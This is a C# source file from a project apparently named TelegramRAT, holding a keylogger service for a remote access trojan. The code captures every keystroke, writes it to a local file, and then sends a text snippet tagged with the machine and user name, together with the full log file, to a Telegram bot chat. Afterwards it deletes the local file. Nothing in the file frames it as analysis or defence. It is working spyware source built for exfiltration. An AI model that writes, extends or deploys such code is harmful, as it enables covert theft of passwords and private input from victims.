using System.Text;
using Telegram.Bot;
using Telegram.Bot.Types;
using TelegramRAT.Utilities;
using TelegramRAT.Features;
using System.Threading.Channels;

namespace TelegramRAT.Services;

public interface IKeyloggerService
{
    bool IsLogging { get; }
    Task StartLoggingAsync(long chatId);
    void StopLogging();
}

public class KeyloggerService(ITelegramBotClient botClient, IBotSession session, IFileSystemService fileSystemService) : IKeyloggerService
{
    public bool IsLogging => session.IsKeylogging;

    private Channel<uint>? _keyChannel;

    public async Task StartLoggingAsync(long chatId)
    {
        if (session.IsKeylogging) return;
        session.IsKeylogging = true;
        
        _keyChannel = Channel.CreateUnbounded<uint>();

        await botClient.SendMessage(chatId, "Keylog started!");

        Features.Keylogger.KeyDown += OnKeyDown;
        Features.Keylogger.Start();

        _ = Task.Run(async () => await ProcessKeyQueueAsync(chatId));
    }

    private void OnKeyDown(object? sender, uint keyCode)
    {
        _keyChannel?.Writer.TryWrite(keyCode);
    }

    private async Task ProcessKeyQueueAsync(long chatId)
    {
        try
        {
            var filePath = fileSystemService.GetFullPath("keylog.txt");
            await using var keylogFileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write, FileShare.Read, 4096, useAsync: true);
            using var streamWriter = new StreamWriter(keylogFileStream, Encoding.UTF8, 1024, leaveOpen: true);

            await streamWriter.WriteLineAsync("#Keylog entries (mapped and unmapped).");
            await streamWriter.WriteLineAsync(string.Empty);

            const int snippetMaxLength = 1024;
            var snippetBuilder = new StringBuilder();

            await foreach (var key in _keyChannel!.Reader.ReadAllAsync())
            {
                var translation = WinAPI.TranslateKeyCombination(new[] { key });
                await streamWriter.WriteLineAsync($"Mapped: {translation.Text}");
                await streamWriter.WriteLineAsync($"Unmapped: {translation.HexFallback}");
                await streamWriter.WriteLineAsync(string.Empty);
                await streamWriter.FlushAsync();

                if (!string.IsNullOrEmpty(translation.Text))
                {
                    snippetBuilder.Append(translation.Text);
                    if (snippetBuilder.Length > snippetMaxLength)
                        snippetBuilder.Remove(0, snippetBuilder.Length - snippetMaxLength);
                }
            }

            await streamWriter.FlushAsync();
            streamWriter.Close();

            var snippet = snippetBuilder.ToString().Trim();
            await botClient.SendMessage(chatId, $"Keylog from {Environment.MachineName}. User: {Environment.UserName}: \n{snippet}");

            await using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read, 4096, useAsync: true))
            {
                await botClient.SendDocument(chatId, new InputFileStream(fs, "keylog.txt"), caption: $"Keylog from {Environment.MachineName}.");
            }
            
            await keylogFileStream.DisposeAsync();
            fileSystemService.DeleteFile(filePath);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Keylogger error: {ex}");
        }
        finally
        {
            Features.Keylogger.Stop();
            Features.Keylogger.KeyDown -= OnKeyDown;
            session.IsKeylogging = false;
        }
    }

    public void StopLogging()
    {
        session.IsKeylogging = false;
        _keyChannel?.Writer.TryComplete();
    }
}
